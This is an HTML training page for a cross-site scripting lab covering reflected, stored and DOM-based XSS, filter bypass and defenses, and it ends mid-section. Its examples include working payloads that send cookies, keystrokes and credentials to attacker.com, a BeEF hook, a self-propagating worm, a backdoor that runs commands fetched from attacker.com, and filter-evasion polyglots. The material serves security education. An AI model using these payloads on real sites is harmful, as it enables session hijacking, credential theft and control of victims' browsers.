<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Attacks Lab - Dark Arts Vault | Hexworth Prime</title>

    <!-- Hexworth Integration -->
    <script src="../../components/AccessGuard.js"></script>
    <script>
        AccessGuard.require('sorted');
    </script>
    <script src="../../components/AchievementManager.js"></script>
    <script src="../../components/ModuleProgress.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a0a1a 0%, #2d0a2d 100%);
            min-height: 100vh;
            padding: 20px;
            color: #e0e0e0;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            background: rgba(26, 10, 26, 0.95);
            border-radius: 15px;
            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 2px solid rgba(168, 85, 247, 0.3);
        }

        .header {
            background: linear-gradient(135deg, #7c3aed 0%, #dc2626 100%);
            padding: 30px;
            text-align: center;
            border-bottom: 3px solid #a855f7;
        }

        .header h1 {
            color: #ffffff;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .header p {
            color: #f0e0f0;
            font-size: 1.1em;
        }

        .header .warning-banner {
            background: rgba(220, 38, 38, 0.3);
            border: 2px solid #dc2626;
            border-radius: 8px;
            padding: 12px 20px;
            margin-top: 15px;
            color: #fca5a5;
            font-weight: 600;
        }

        .back-link {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s ease;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .back-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr 380px;
            gap: 0;
            min-height: calc(100vh - 200px);
        }

        .workspace {
            display: flex;
            flex-direction: column;
            border-right: 2px solid rgba(168, 85, 247, 0.3);
        }

        .tab-container {
            display: flex;
            background: rgba(26, 10, 26, 0.9);
            border-bottom: 2px solid rgba(168, 85, 247, 0.3);
            padding: 10px 20px 0;
            gap: 5px;
            flex-wrap: wrap;
        }

        .tab {
            padding: 12px 24px;
            background: rgba(168, 85, 247, 0.1);
            border: 2px solid transparent;
            border-bottom: none;
            border-radius: 8px 8px 0 0;
            cursor: pointer;
            transition: all 0.3s ease;
            color: #b0b0b0;
            font-weight: 500;
        }

        .tab:hover {
            background: rgba(168, 85, 247, 0.2);
            color: #e0e0e0;
        }

        .tab.active {
            background: rgba(168, 85, 247, 0.3);
            border-color: #a855f7;
            color: #ffffff;
        }

        .content-area {
            flex: 1;
            overflow-y: auto;
            padding: 30px;
        }

        .section {
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .section.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 {
            color: #a855f7;
            margin-bottom: 20px;
            font-size: 1.8em;
            border-bottom: 2px solid rgba(168, 85, 247, 0.3);
            padding-bottom: 10px;
        }

        h3 {
            color: #c084fc;
            margin-top: 25px;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        h4 {
            color: #e9d5ff;
            margin-top: 20px;
            margin-bottom: 12px;
            font-size: 1.1em;
        }

        p, li {
            line-height: 1.8;
            color: #d0d0d0;
            margin-bottom: 12px;
        }

        ul, ol {
            margin-left: 25px;
            margin-bottom: 15px;
        }

        .callout {
            background: rgba(168, 85, 247, 0.1);
            border-left: 4px solid #a855f7;
            padding: 15px 20px;
            margin: 20px 0;
            border-radius: 4px;
        }

        .callout.warning {
            background: rgba(220, 38, 38, 0.1);
            border-left-color: #dc2626;
        }

        .callout.info {
            background: rgba(59, 130, 246, 0.1);
            border-left-color: #3b82f6;
        }

        .callout.success {
            background: rgba(34, 197, 94, 0.1);
            border-left-color: #22c55e;
        }

        code {
            background: rgba(0, 0, 0, 0.3);
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            color: #fbbf24;
            font-size: 0.9em;
        }

        pre {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 8px;
            padding: 15px;
            overflow-x: auto;
            margin: 15px 0;
        }

        pre code {
            background: none;
            padding: 0;
            color: #a5f3fc;
            font-size: 0.95em;
        }

        .sandbox-container {
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid #a855f7;
            border-radius: 10px;
            padding: 25px;
            margin: 25px 0;
        }

        .sandbox-title {
            color: #a855f7;
            font-size: 1.2em;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            color: #c084fc;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-group input,
        .input-group textarea {
            width: 100%;
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(168, 85, 247, 0.3);
            color: #e0e0e0;
            padding: 12px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 0.95em;
        }

        .input-group input:focus,
        .input-group textarea:focus {
            outline: none;
            border-color: #a855f7;
            box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.1);
        }

        .btn {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            margin-right: 10px;
            margin-bottom: 10px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(168, 85, 247, 0.4);
        }

        .btn-danger {
            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
        }

        .btn-danger:hover {
            box-shadow: 0 5px 15px rgba(220, 38, 38, 0.4);
        }

        .output-box {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 6px;
            padding: 15px;
            margin-top: 15px;
            min-height: 100px;
            font-family: 'Courier New', monospace;
            color: #a5f3fc;
        }

        .vulnerable-frame {
            background: white;
            border: 2px solid #dc2626;
            border-radius: 6px;
            padding: 20px;
            margin-top: 15px;
            min-height: 150px;
            color: #000;
        }

        .sidebar {
            background: rgba(15, 5, 15, 0.8);
            padding: 25px;
            overflow-y: auto;
        }

        .sidebar h3 {
            color: #a855f7;
            font-size: 1.1em;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid rgba(168, 85, 247, 0.3);
        }

        .payload-item {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .payload-item:hover {
            border-color: #a855f7;
            background: rgba(168, 85, 247, 0.1);
        }

        .payload-code {
            font-family: 'Courier New', monospace;
            color: #fbbf24;
            font-size: 0.85em;
            word-break: break-all;
        }

        .payload-desc {
            color: #a0a0a0;
            font-size: 0.85em;
            margin-top: 5px;
        }

        .tool-card {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }

        .tool-card h4 {
            margin-top: 0;
        }

        .quiz-container {
            background: rgba(0, 0, 0, 0.3);
            border: 2px solid #a855f7;
            border-radius: 10px;
            padding: 25px;
            margin-top: 25px;
        }

        .quiz-question {
            margin-bottom: 25px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
        }

        .quiz-question h4 {
            margin-top: 0;
            color: #c084fc;
        }

        .quiz-option {
            background: rgba(168, 85, 247, 0.1);
            border: 2px solid transparent;
            padding: 12px;
            margin: 8px 0;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .quiz-option:hover {
            border-color: #a855f7;
            background: rgba(168, 85, 247, 0.2);
        }

        .quiz-option.selected {
            border-color: #3b82f6;
            background: rgba(59, 130, 246, 0.2);
        }

        .quiz-option.correct {
            border-color: #22c55e;
            background: rgba(34, 197, 94, 0.2);
        }

        .quiz-option.incorrect {
            border-color: #dc2626;
            background: rgba(220, 38, 38, 0.2);
        }

        .quiz-results {
            background: rgba(168, 85, 247, 0.2);
            border: 2px solid #a855f7;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }

        .quiz-score {
            font-size: 2em;
            color: #a855f7;
            margin: 10px 0;
        }

        .payload-builder {
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid #a855f7;
            border-radius: 10px;
            padding: 25px;
            margin-top: 25px;
        }

        .builder-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }

        .builder-option {
            background: rgba(168, 85, 247, 0.1);
            border: 2px solid rgba(168, 85, 247, 0.3);
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }

        .builder-option:hover {
            border-color: #a855f7;
            background: rgba(168, 85, 247, 0.2);
        }

        .builder-option.selected {
            border-color: #a855f7;
            background: rgba(168, 85, 247, 0.3);
        }

        .generated-payload {
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid #22c55e;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            font-family: 'Courier New', monospace;
            color: #a5f3fc;
        }

        .progress-indicator {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .progress-bar {
            background: rgba(0, 0, 0, 0.5);
            height: 8px;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 10px;
        }

        .progress-fill {
            background: linear-gradient(90deg, #7c3aed 0%, #a855f7 100%);
            height: 100%;
            transition: width 0.5s ease;
        }

        @media (max-width: 1024px) {
            .main-content {
                grid-template-columns: 1fr;
            }

            .workspace {
                border-right: none;
                border-bottom: 2px solid rgba(168, 85, 247, 0.3);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Cross-Site Scripting (XSS) Attacks Lab</h1>
            <p>Master the Art of Client-Side Exploitation</p>
            <div class="warning-banner">
                ETHICAL USE ONLY - These techniques are for defensive security training. Unauthorized testing is illegal.
            </div>
            <a href="../index.html" class="back-link">Return to Vault</a>
        </div>

        <div class="main-content">
            <div class="workspace">
                <div class="tab-container">
                    <div class="tab active" data-tab="overview">Overview</div>
                    <div class="tab" data-tab="reflected">Reflected XSS</div>
                    <div class="tab" data-tab="stored">Stored XSS</div>
                    <div class="tab" data-tab="dom">DOM-Based XSS</div>
                    <div class="tab" data-tab="sandbox">Interactive Sandbox</div>
                    <div class="tab" data-tab="bypass">Filter Bypass</div>
                    <div class="tab" data-tab="tools">Tools</div>
                    <div class="tab" data-tab="defense">Defense</div>
                    <div class="tab" data-tab="quiz">Quiz</div>
                </div>

                <div class="content-area">
                    <!-- OVERVIEW SECTION -->
                    <div class="section active" id="overview">
                        <h2>Cross-Site Scripting (XSS) Overview</h2>

                        <div class="callout warning">
                            <strong>Critical Warning:</strong> XSS is one of the most prevalent web vulnerabilities. Understanding it is essential for both attackers and defenders.
                        </div>

                        <h3>What is XSS?</h3>
                        <p>Cross-Site Scripting (XSS) is a client-side code injection attack where an attacker injects malicious scripts into trusted websites. When other users view the affected page, the malicious script executes in their browser with the privileges of the vulnerable site.</p>

                        <h3>Impact of XSS Attacks</h3>
                        <ul>
                            <li><strong>Session Hijacking:</strong> Steal authentication cookies to impersonate victims</li>
                            <li><strong>Credential Theft:</strong> Capture keystrokes, form data, and passwords</li>
                            <li><strong>Website Defacement:</strong> Modify page content to display malicious information</li>
                            <li><strong>Phishing:</strong> Display fake login forms to harvest credentials</li>
                            <li><strong>Malware Distribution:</strong> Redirect users to malicious sites or trigger downloads</li>
                            <li><strong>Browser Exploitation:</strong> Leverage browser vulnerabilities for system access</li>
                        </ul>

                        <h3>XSS Attack Flow</h3>
                        <ol>
                            <li><strong>Discovery:</strong> Attacker identifies injection points (search boxes, comment fields, URL parameters)</li>
                            <li><strong>Payload Crafting:</strong> Create malicious JavaScript tailored to bypass filters</li>
                            <li><strong>Injection:</strong> Insert payload into vulnerable input</li>
                            <li><strong>Execution:</strong> Victim's browser executes the script</li>
                            <li><strong>Exploitation:</strong> Attacker achieves objectives (steal data, redirect, etc.)</li>
                        </ol>

                        <h3>Testing Methodology</h3>
                        <div class="callout info">
                            <strong>Professional Approach:</strong>
                            <ol>
                                <li>Map all user input fields (forms, URLs, headers)</li>
                                <li>Test with basic payloads: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
                                <li>Analyze context (HTML, attribute, JavaScript, URL)</li>
                                <li>Craft context-specific payloads</li>
                                <li>Test filter bypass techniques</li>
                                <li>Document findings with proof-of-concept</li>
                            </ol>
                        </div>

                        <h3>Attack Contexts</h3>
                        <div class="tool-card">
                            <h4>HTML Context</h4>
                            <p>Injection into HTML body content</p>
                            <pre><code>&lt;div&gt;User input here: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code></pre>
                        </div>

                        <div class="tool-card">
                            <h4>Attribute Context</h4>
                            <p>Injection into HTML attributes</p>
                            <pre><code>&lt;input value="USER_INPUT" onmouseover="alert('XSS')"&gt;</code></pre>
                        </div>

                        <div class="tool-card">
                            <h4>JavaScript Context</h4>
                            <p>Injection into JavaScript code</p>
                            <pre><code>&lt;script&gt;var name = 'USER_INPUT'; alert(name);&lt;/script&gt;</code></pre>
                        </div>

                        <div class="tool-card">
                            <h4>URL Context</h4>
                            <p>Injection into href or src attributes</p>
                            <pre><code>&lt;a href="javascript:alert('XSS')"&gt;Click&lt;/a&gt;</code></pre>
                        </div>

                        <div class="progress-indicator">
                            <strong>Module Progress</strong>
                            <div class="progress-bar">
                                <div class="progress-fill" id="progressBar" style="width: 0%"></div>
                            </div>
                            <p style="margin-top: 10px; color: #a0a0a0;">Complete all sections and pass the quiz to finish this module</p>
                        </div>
                    </div>

                    <!-- REFLECTED XSS SECTION -->
                    <div class="section" id="reflected">
                        <h2>Reflected XSS (Non-Persistent)</h2>

                        <div class="callout">
                            <strong>Definition:</strong> Reflected XSS occurs when malicious script is reflected off a web server in an immediate response. The payload is part of the request (URL parameter, form submission) and is not stored.
                        </div>

                        <h3>How Reflected XSS Works</h3>
                        <ol>
                            <li>Attacker crafts malicious URL containing JavaScript payload</li>
                            <li>Victim clicks the link (via phishing, social engineering)</li>
                            <li>Server reflects the payload in the response without sanitization</li>
                            <li>Browser executes the script in the context of the vulnerable site</li>
                        </ol>

                        <h3>Example Scenario: Vulnerable Search</h3>
                        <pre><code>// Vulnerable server code (PHP example)
&lt;?php
  $search = $_GET['q'];
  echo "You searched for: " . $search;
?&gt;

// Attack URL
https://vulnerable-site.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;

// Page renders as:
You searched for: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>

                        <h3>Real-World Example</h3>
                        <p>A search feature that displays "No results for: [user input]" without encoding could be exploited:</p>
                        <pre><code>https://shop.example.com/search?term=&lt;img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)&gt;</code></pre>

                        <div class="callout warning">
                            <strong>Delivery Methods:</strong>
                            <ul>
                                <li>Phishing emails with malicious links</li>
                                <li>Shortened URLs to hide payload</li>
                                <li>QR codes linking to malicious URLs</li>
                                <li>Compromised websites with malicious iframes</li>
                            </ul>
                        </div>

                        <h3>Advanced Reflected XSS</h3>
                        <h4>Cookie Theft</h4>
                        <pre><code>&lt;script&gt;
  new Image().src='https://attacker.com/log?c='+document.cookie;
&lt;/script&gt;</code></pre>

                        <h4>Keylogger Injection</h4>
                        <pre><code>&lt;script&gt;
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?k='+e.key);
  });
&lt;/script&gt;</code></pre>

                        <h4>Credential Harvesting</h4>
                        <pre><code>&lt;script&gt;
  document.body.innerHTML = '&lt;form action="https://attacker.com/steal"&gt;' +
    '&lt;h3&gt;Session Expired - Please Re-login&lt;/h3&gt;' +
    '&lt;input name="user" placeholder="Username"&gt;' +
                            '&lt;input name="pass" type="password" placeholder="Password"&gt;' +
    '&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;';
&lt;/script&gt;</code></pre>

                        <h3>Detection Tips</h3>
                        <ul>
                            <li>Look for user input reflected in error messages</li>
                            <li>Test URL parameters, especially search and filter functions</li>
                            <li>Check HTTP headers (User-Agent, Referer) reflected in responses</li>
                            <li>Analyze 404 error pages that display requested URLs</li>
                        </ul>

                        <div class="callout success">
                            <strong>Mitigation:</strong> Output encoding, Content Security Policy (CSP), validate and sanitize all user input before reflection.
                        </div>
                    </div>

                    <!-- STORED XSS SECTION -->
                    <div class="section" id="stored">
                        <h2>Stored XSS (Persistent)</h2>

                        <div class="callout warning">
                            <strong>Most Dangerous:</strong> Stored XSS is considered the most critical XSS type because it affects all users who view the infected page, not just a targeted victim.
                        </div>

                        <h3>How Stored XSS Works</h3>
                        <ol>
                            <li>Attacker submits malicious payload through input field (comment, profile, message)</li>
                            <li>Server stores the payload in database without sanitization</li>
                            <li>When any user views the page, server retrieves and displays the payload</li>
                            <li>Browser executes the script for every victim who loads the page</li>
                        </ol>

                        <h3>Common Injection Points</h3>
                        <ul>
                            <li><strong>User Profiles:</strong> Bio, about me, username fields</li>
                            <li><strong>Comments:</strong> Blog comments, forum posts, product reviews</li>
                            <li><strong>Messages:</strong> Private messages, chat applications</li>
                            <li><strong>File Uploads:</strong> SVG files, HTML files with metadata</li>
                            <li><strong>Settings:</strong> Custom themes, signatures, display names</li>
                        </ul>

                        <h3>Example: Comment System</h3>
                        <pre><code>// Vulnerable comment storage
POST /comments
Body: {
  "comment": "&lt;script&gt;alert('All users will see this!')&lt;/script&gt;"
}

// Database stores raw payload
INSERT INTO comments (text) VALUES ('&lt;script&gt;...')

// Page renders for all users
&lt;div class="comment"&gt;
  &lt;script&gt;alert('All users will see this!')&lt;/script&gt;
&lt;/div&gt;</code></pre>

                        <h3>Advanced Persistent Attacks</h3>
                        <h4>BeEF Hook Injection</h4>
                        <p>Browser Exploitation Framework can control victim browsers:</p>
                        <pre><code>&lt;script src="http://attacker.com:3000/hook.js"&gt;&lt;/script&gt;</code></pre>

                        <h4>Self-Propagating XSS Worm</h4>
                        <p>Script that replicates itself (like Samy worm on MySpace 2005):</p>
                        <pre><code>&lt;script&gt;
  // Read own payload from DOM
  var payload = document.getElementById('worm').innerHTML;

  // Post to all friends' profiles
  friends.forEach(friend =&gt; {
    fetch('/post', {
      method: 'POST',
      body: JSON.stringify({to: friend, message: payload})
    });
  });
&lt;/script&gt;</code></pre>

                        <h4>Persistent Backdoor</h4>
                        <pre><code>&lt;script&gt;
  setInterval(function() {
    fetch('https://attacker.com/cmd')
      .then(r =&gt; r.text())
      .then(cmd =&gt; eval(cmd));
  }, 5000); // Check for commands every 5 seconds
&lt;/script&gt;</code></pre>

                        <h3>File Upload XSS</h3>
                        <p>SVG files can contain JavaScript:</p>
                        <pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
  &lt;script&gt;alert('XSS via SVG')&lt;/script&gt;
&lt;/svg&gt;</code></pre>

                        <div class="callout info">
                            <strong>Business Impact:</strong> A single stored XSS vulnerability can compromise thousands of users, steal admin sessions, and completely undermine application security. Many bug bounties pay $5,000-$25,000+ for stored XSS.
                        </div>

                        <h3>Testing Stored XSS</h3>
                        <ol>
                            <li>Identify all input fields that store data</li>
                            <li>Submit test payloads with unique identifiers</li>
                            <li>Navigate to pages where data is displayed</li>
                            <li>Check if payload executes</li>
                            <li>Test from different user accounts (your payload affecting others)</li>
                        </ol>
                    </div>

                    <!-- DOM-BASED XSS SECTION -->
                    <div class="section" id="dom">
                        <h2>DOM-Based XSS</h2>

                        <div class="callout">
                            <strong>Definition:</strong> DOM-based XSS occurs when client-side JavaScript processes user input unsafely, modifying the DOM in a way that executes malicious code. The server is not involved - the vulnerability exists entirely in client-side code.
                        </div>

                        <h3>How DOM XSS Works</h3>
                        <ol>
                            <li>Malicious payload is in URL fragment or parameter</li>
                            <li>Client-side JavaScript reads the payload (from window.location, document.URL)</li>
                            <li>Code inserts payload into DOM using dangerous sinks</li>
                            <li>Browser executes the script</li>
                        </ol>

                        <h3>Sources and Sinks</h3>
                        <h4>Common Sources (Where attacker-controlled data comes from)</h4>
                        <pre><code>// URL-based sources
window.location.hash
window.location.search
document.URL
document.documentURI
document.URLUnencoded
document.referrer

// Other sources
window.name
document.cookie
localStorage/sessionStorage</code></pre>

                        <h4>Dangerous Sinks (Where data gets executed)</h4>
                        <pre><code>// Direct execution
eval()
Function()
setTimeout(string)
setInterval(string)

// DOM manipulation
document.write()
document.writeln()
element.innerHTML
element.outerHTML

// Navigation
window.location
window.open()
element.src (script, iframe)
element.href (when javascript:)</code></pre>

                        <h3>Example Vulnerable Code</h3>
                        <pre><code>// Vulnerable: Reading from URL and writing to DOM
&lt;script&gt;
  var name = window.location.hash.substring(1);
  document.getElementById('welcome').innerHTML = 'Hello ' + name;
&lt;/script&gt;

// Attack URL
https://site.com/welcome.html#&lt;img src=x onerror=alert('XSS')&gt;

// Result: innerHTML becomes
Hello &lt;img src=x onerror=alert('XSS')&gt;</code></pre>

                        <h3>Real-World DOM XSS Examples</h3>

                        <h4>Example 1: URL Fragment Processing</h4>
                        <pre><code>// Vulnerable code
var page = location.hash.substring(1);
document.write('&lt;div&gt;' + page + '&lt;/div&gt;');

// Attack
https://site.com/#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>

                        <h4>Example 2: Client-Side Routing</h4>
                        <pre><code>// Vulnerable SPA routing
var route = location.pathname;
document.getElementById('content').innerHTML = routes[route];

// Attack via path injection
https://site.com/&lt;img src=x onerror=alert(1)&gt;</code></pre>

                        <h4>Example 3: PostMessage Handler</h4>
                        <pre><code>// Vulnerable postMessage listener
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});

// Attack from malicious iframe
targetWindow.postMessage('&lt;img src=x onerror=alert(1)&gt;', '*');</code></pre>

                        <h3>Advanced DOM XSS Techniques</h3>

                        <h4>jQuery Sink Exploitation</h4>
                        <pre><code>// Vulnerable jQuery
var user = location.hash.substring(1);
$('#div').html(user);

// Attack
#&lt;img src=x onerror=alert(1)&gt;</code></pre>

                        <h4>AngularJS Template Injection</h4>
                        <pre><code>// Vulnerable Angular binding
&lt;div ng-bind-html="userInput"&gt;&lt;/div&gt;

// Attack
{{constructor.constructor('alert(1)')()}}</code></pre>

                        <h4>React dangerouslySetInnerHTML</h4>
                        <pre><code>// Vulnerable React component
&lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;

// Attack
&lt;img src=x onerror=alert(1)&gt;</code></pre>

                        <div class="callout warning">
                            <strong>Detection Challenge:</strong> DOM XSS doesn't appear in server logs or HTTP responses, making it harder to detect with traditional scanners. Requires code review and dynamic testing.
                        </div>

                        <h3>Testing for DOM XSS</h3>
                        <ol>
                            <li>Review all client-side JavaScript for sources and sinks</li>
                            <li>Test URL parameters, fragments, and hash values</li>
                            <li>Use browser DevTools to set breakpoints on dangerous sinks</li>
                            <li>Test with DOM XSS-specific payloads</li>
                            <li>Check modern frameworks (React, Angular, Vue) for template injection</li>
                        </ol>

                        <div class="callout success">
                            <strong>Secure Alternative:</strong> Use textContent instead of innerHTML, avoid eval and Function constructors, sanitize data before DOM insertion.
                        </div>
                    </div>

                    <!-- INTERACTIVE SANDBOX SECTION -->
                    <div class="section" id="sandbox">
                        <h2>Interactive XSS Sandbox</h2>

                        <div class="callout warning">
                            <strong>Educational Demo Only:</strong> This sandbox is completely client-side and demonstrates XSS behavior safely. No actual exploitation occurs.
                        </div>

                        <div class="sandbox-container">
                            <div class="sandbox-title">Vulnerable Search Box Simulator</div>
                            <p style="color: #a0a0a0; margin-bottom: 15px;">This simulates a vulnerable search feature. Try different XSS payloads to see what would happen on a real vulnerable site.</p>

                            <div class="input-group">
                                <label>Enter Search Query (Try XSS payloads):</label>
                                <input type="text" id="sandboxInput" placeholder="Try: <script>alert('XSS')</script>">
                            </div>

                            <button class="btn" onclick="testXSS()">Test Payload</button>
                            <button class="btn btn-danger" onclick="clearSandbox()">Clear Output</button>

                            <div class="output-box" id="sandboxOutput" style="margin-top: 15px;">
                                <em>Output will appear here...</em>
                            </div>

                            <div class="vulnerable-frame" id="vulnerableFrame">
                                <strong>Simulated Vulnerable Page:</strong>
                                <div id="simulatedOutput" style="margin-top: 10px; min-height: 50px;"></div>
                            </div>
                        </div>

                        <div class="sandbox-container">
                            <div class="sandbox-title">Reflected XSS Demo</div>
                            <p style="color: #a0a0a0; margin-bottom: 15px;">Simulates how reflected XSS appears in search results or error messages.</p>

                            <div class="input-group">
                                <label>Search Parameter:</label>
                                <input type="text" id="reflectedInput" placeholder="Enter search term" value="test">
                            </div>

                            <button class="btn" onclick="simulateReflected()">Simulate Search</button>

                            <div class="output-box" id="reflectedDemo">
                                <em>Simulated server response will appear here...</em>
                            </div>
                        </div>

                        <div class="sandbox-container">
                            <div class="sandbox-title">DOM XSS Demo</div>
                            <p style="color: #a0a0a0; margin-bottom: 15px;">Shows how DOM manipulation can lead to XSS.</p>

                            <div class="input-group">
                                <label>URL Fragment (everything after #):</label>
                                <input type="text" id="domInput" placeholder="Try: <img src=x onerror=alert('DOM-XSS')>">
                            </div>

                            <button class="btn" onclick="simulateDOM()">Simulate DOM Manipulation</button>

                            <div class="output-box" id="domDemo">
                                <em>DOM manipulation result will appear here...</em>
                            </div>
                        </div>

                        <div class="callout info">
                            <strong>What You're Learning:</strong>
                            <ul>
                                <li>How unsanitized input appears in page output</li>
                                <li>The difference between encoded and unencoded output</li>
                                <li>How attackers craft payloads to bypass simple filters</li>
                                <li>Why output encoding is critical for XSS prevention</li>
                            </ul>
                        </div>
                    </div>

                    <!-- FILTER BYPASS SECTION -->
                    <div class="section" id="bypass">
                        <h2>Filter Bypass Techniques</h2>

                        <div class="callout">
                            <strong>Reality Check:</strong> Many developers implement basic blacklist filters that are easily bypassed. Understanding these techniques is essential for proper testing and defense.
                        </div>

                        <h3>Case Variation</h3>
                        <p>Many filters are case-sensitive and miss variations:</p>
                        <pre><code>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;
&lt;script&gt;ALERT('XSS')&lt;/script&gt;
&lt;sCrIpT&gt;alert('XSS')&lt;/sCrIpT&gt;</code></pre>

                        <h3>HTML Encoding</h3>
                        <p>Using HTML entities to bypass filters:</p>
                        <pre><code>&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"&gt;
&lt;img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"&gt;
&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</code></pre>

                        <h3>Alternative Event Handlers</h3>
                        <p>When <code>onerror</code> is blocked, try these:</p>
                        <pre><code>&lt;img src=x onload=alert(1)&gt;
&lt;body onload=alert(1)&gt;
&lt;input onfocus=alert(1) autofocus&gt;
&lt;select onfocus=alert(1) autofocus&gt;
&lt;textarea onfocus=alert(1) autofocus&gt;
&lt;keygen onfocus=alert(1) autofocus&gt;
&lt;marquee onstart=alert(1)&gt;
&lt;div onpointerenter=alert(1)&gt;Hover me&lt;/div&gt;
&lt;details open ontoggle=alert(1)&gt;</code></pre>

                        <h3>SVG and Math Elements</h3>
                        <p>Less commonly filtered tags:</p>
                        <pre><code>&lt;svg onload=alert(1)&gt;
&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;animate onbegin=alert(1)&gt;
&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/math&gt;</code></pre>

                        <h3>Polyglot Payloads</h3>
                        <p>Works in multiple contexts:</p>
                        <pre><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</code></pre>

                        <h3>Tag Breakout</h3>
                        <p>When injection is inside an attribute:</p>
                        <pre><code>" onmouseover="alert(1)
' onmouseover='alert(1)
"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

                        <h3>Protocol Handlers</h3>
                        <p>JavaScript protocol in various contexts:</p>
                        <pre><code>&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;
&lt;iframe src="javascript:alert(1)"&gt;
&lt;form action="javascript:alert(1)"&gt;
&lt;object data="javascript:alert(1)"&gt;
&lt;embed src="javascript:alert(1)"&gt;</code></pre>

                        <h3>Unicode and Encoding Tricks</h3>
                        <pre><code>// Unicode escape
\u003cscript\u003ealert(1)\u003c/script\u003e

// URL encoding
%3Cscript%3Ealert(1)%3C/script%3E

// Double URL encoding
%253Cscript%253Ealert(1)%253C/script%253E

// Mixed encoding
&lt;scri%00pt&gt;alert(1)&lt;/scri%00pt&gt;</code></pre>

                        <h3>Obfuscation Techniques</h3>
                        <pre><code>// String concatenation
&lt;script&gt;alert('XS'+'S')&lt;/script&gt;

// Eval with encoding
